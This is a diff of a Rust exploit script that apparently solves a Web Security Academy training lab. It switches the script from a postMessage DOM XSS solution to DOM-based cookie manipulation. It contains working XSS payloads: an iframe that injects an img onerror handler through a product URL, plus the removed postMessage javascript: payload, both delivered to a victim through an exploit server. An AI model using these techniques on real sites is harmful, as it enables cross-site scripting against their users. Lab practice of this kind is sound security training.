@@ -1,13 +1,14 @@
-/******************************************************************
+/*********************************************************************
 *
-* Lab: DOM XSS using web messages and JSON.parse
+* Lab: DOM-based cookie manipulation
 *
 * Hack Steps:
-*      1. Craft an iframe that, upon loading, will send an XSS
-*         payload using the postMessage API
+*      1. Craft an iframe with the XSS payload in its src attribute
+*         and make its onload handler redirect the victim to
+*         the main page, triggering the XSS payload
 *      2. Deliver the exploit to the victim
 *
-*******************************************************************/
+**********************************************************************/
 use reqwest::{
     blocking::{Client, ClientBuilder},
     redirect::Policy,
@@ -20,20 +21,21 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a4100bf04e31577803a3fca001700f0.web-security-academy.net";
+const LAB_URL: &str = "https://0a430063047c7d188381e1a5000c0068.web-security-academy.net";
 
 // Change this to your exploit server URL
 const EXPLOIT_SERVER_URL: &str =
-    "https://exploit-0aa500c9044c1557801d3e0a017000a3.exploit-server.net";
+    "https://exploit-0a7b0075041c7d478382e0da01750042.exploit-server.net";
 
 fn main() {
     print!("❯❯ Delivering the exploit to the victim.. ");
     io::stdout().flush().unwrap();
 
-    let xss_payload = r###"{ \"type\": \"load-channel\", \"url\": \"javascript:print()\" }"###;
+    let xss_payload = "&'><img src=1 onerror=print()>";
     let payload = format!(
-        r###"<iframe src='{LAB_URL}' onload='this.contentWindow.postMessage("{xss_payload}","*")'>"###
+        r###"<iframe src="{LAB_URL}/product?productId=2{xss_payload}" onload="if(!window.x)this.src='{LAB_URL}';window.x=1;" >"###
     );
+
     deliver_exploit_to_victim(&payload);
 
     println!("{}", "OK".green());
